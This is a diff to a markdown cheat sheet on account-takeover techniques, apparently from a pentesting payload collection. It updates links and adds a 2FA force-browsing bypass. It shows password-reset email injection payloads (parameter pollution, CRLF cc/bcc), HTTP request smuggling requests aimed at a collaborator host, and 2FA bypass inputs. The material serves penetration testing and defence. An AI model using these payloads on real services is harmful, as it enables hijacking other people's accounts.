@@ -1,14 +1,13 @@
 +++
 title = "Account Takeovers"
-date = "2022-10-16"
+date = "2023-03-28"
 description = "All about account take over techniques, methods, payloads, how/why/when they work."
+include_toc = 'true'
 +++ 
 
-# Account Takeover
-
-## Tools
-
-- [Unisub - is a tool that can suggest potential unicode characters that may be converted to a given character](https://github.com/tomnomnom/hacks/tree/master/unisub).
+    * [Bypass 2FA with null or 000000](#bypass-2fa-with-null-or-000000)
+    * [Bypass 2FA with array](#bypass-2fa-with-array)
+* [References](#references)
 
 ## Password Reset Feature
 
@@ -40,14 +39,11 @@ description = "All about account take over techniques, methods, payloads, how/wh
 ```powershell
 # parameter pollution
 email=victim@mail.com&email=hacker@mail.com
-
 # array of emails
 {"email":["victim@mail.com","hacker@mail.com"]}
-
 # carbon copy
 email=victim@mail.com%0A%0Dcc:hacker@mail.com
 email=victim@mail.com%0A%0Dbcc:hacker@mail.com
-
 # separator
 email=victim@mail.com,hacker@mail.com
 email=victim@mail.com%20hacker@mail.com
@@ -94,15 +90,20 @@ Try to determine if the token expire or if it's always the same, in some cases t
 3. Use the token sent to your email and reset the victim password.
 4. Connect to the victim account with the new password.
 
-The platform CTFd was vulnerable to this attack. 
+The platform CTFd was vulnerable to this attack.
 See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
 
 
 ### Account takeover due to unicode normalization issue
 
+When processing user input involving unicode for case mapping or normalisation, unexcepted behavior can occur.
+
 - Victim account: `demo@gmail.com`
 - Attacker account: `demⓞ@gmail.com`
 
+[Unisub - is a tool that can suggest potential unicode characters that may be converted to a given character](https://github.com/tomnomnom/hacks/tree/master/unisub).
+
+[Unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/) can be used to find list of suitable unicode characters based on platform.
 
 ## Account Takeover Via Cross Site Scripting
 
@@ -114,30 +115,28 @@ See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
 
 Refer to **HTTP Request Smuggling** vulnerability page.
 1. Use **smuggler** to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)
-    ```bash
+    ```powershell
     git clone https://github.com/defparam/smuggler.git
     cd smuggler
     python3 smuggler.py -h
     ```
 2. Craft a request which will overwrite the `POST / HTTP/1.1` with the following data:
-    ```http
+    ```powershell
     GET http://something.burpcollaborator.net  HTTP/1.1
-    X: 
+    X:
     ```
 3. Final request could look like the following
-    ```http
+    ```powershell
     GET /  HTTP/1.1
     Transfer-Encoding: chunked
     Host: something.com
     User-Agent: Smuggler/v1.0
     Content-Length: 83
-
     0
-
     GET http://something.burpcollaborator.net  HTTP/1.1
     X: X
     ```
-    
+
 Hackerone reports exploiting this bug
 * https://hackerone.com/reports/737140
 * https://hackerone.com/reports/771666
@@ -149,10 +148,10 @@ Hackerone reports exploiting this bug
 
 ## Account Takeover via JWT
 
-JSON Web Token might be used to authenticate an user. 
+JSON Web Token might be used to authenticate an user.
 
 * Edit the JWT with another User ID / Email
-* Check for weak JWT signature 
+* Check for weak JWT signature
 
 ## 2FA Bypasses
 
@@ -207,6 +206,10 @@ Iframing the 2FA Disabling page and social engineering victim to disable the 2FA
 
 If the session is already hijacked and there is a session timeout vuln
 
+### Bypass 2FA by Force Browsing
+
+If the application redirects to `/my-account` url upon login while 2Fa is disabled, try replacing `/2fa/verify` with `/my-account` while 2FA is enabled to bypass verification.
+
 ### Bypass 2FA with null or 000000
 Enter the code **000000** or **null** to bypass 2FA protection.
 
@@ -236,9 +239,9 @@ Enter the code **000000** or **null** to bypass 2FA protection.
 
 ## References
 
-- [10 Password Reset Flaws - Anugrah SR](http://anugrahsr.me/posts/10-Password-reset-flaws/)
+- [10 Password Reset Flaws - Anugrah SR](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
 - [$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained](https://www.youtube.com/watch?v=gzM4wWA7RFo&feature=youtu.be)
 - [Broken Cryptography & Account Takeovers - Harsh Bothra - September 20, 2020](https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28)
 - [Hacking Grindr Accounts with Copy and Paste - Troy HUNT & Wassime BOUIMADAGHENE - 03 OCTOBER 2020](https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/)
 - [CTFd Account Takeover](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
-- [Unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/) can be used to find list of suitable unicode characters based on platform.
+- [2FA simple bypass](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)
